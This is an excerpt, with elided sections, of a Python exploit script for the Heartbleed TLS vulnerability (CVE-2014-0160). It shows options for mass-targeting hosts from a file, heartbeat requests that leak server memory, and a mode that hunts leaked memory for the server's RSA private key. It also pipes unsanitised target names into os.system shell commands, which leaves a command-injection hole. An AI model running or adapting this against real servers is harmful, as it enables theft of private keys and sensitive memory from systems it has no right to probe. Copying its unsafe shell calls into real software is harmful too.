...
options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS\
 heartbeat vulnerability aka heartbleed (CVE-2014-0160)')

options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

options.add_option('-l', '--length', type='int', default=0x4000, dest="len", help='payload\
 length to test (default: 0x4000)')

options.add_option('-n', '--num', type='int', default=1, help='Number\
 of times to connect/loop (default: 1)')

options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue\
 STARTTLS command for SMTP/POP/IMAP/FTP/etc...')

options.add_option('-f', '--filein', type='str', help='Specify\
 input file, line delimited, IPs or hostnames or IP:port or hostname:port')
...
options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do\
 not display returned data on screen')

options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt\
 to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned\
  data on screen.')
...
def hit_hb(s, targ, firstrun, supported):
    ...
    while True:
        ...
        if typ is None:
            print('No hertbeat respaonse received, server likely not vulnerable')
        ...
        if typ == 24:
            ...
            if len(pay) > 0x29:
                ...
                if firstrun or opts.verbose:
                    print('\nWARNING: ' + targ + ':' + str(
                        opts.port) + ' returned more data than it should - server is vulnerable!')
    ...
    try:
        ...
        for x in range(0, opts.num):
            ...
            if x == 0 and opts.extractkey:
                ...
                os.system('echo | openssl s_client -connect ' + targ + ':' + str(
                    port) + ' -showcerts | openssl x509 > hb-certs/sslcert_' + targ + '.pem')

                print('\nExtracting modulus from cert...\n')

                os.system('openssl x509 -pubkey -noout -in\
                 hb-certs/sslcert_' + targ + '.pem > hb-certs/sslcert_' + targ + '_pubkey.pem')
...
def extractkey(host, chunk, modulus):
    ...
    for offset in range(0, len(chunk) - keysize):
        ...
        p = long(''.join(["%02x" % ord(chunk[x]) for x in range(offset + keysize - 1, offset - 1, -1)]).strip(), 16)
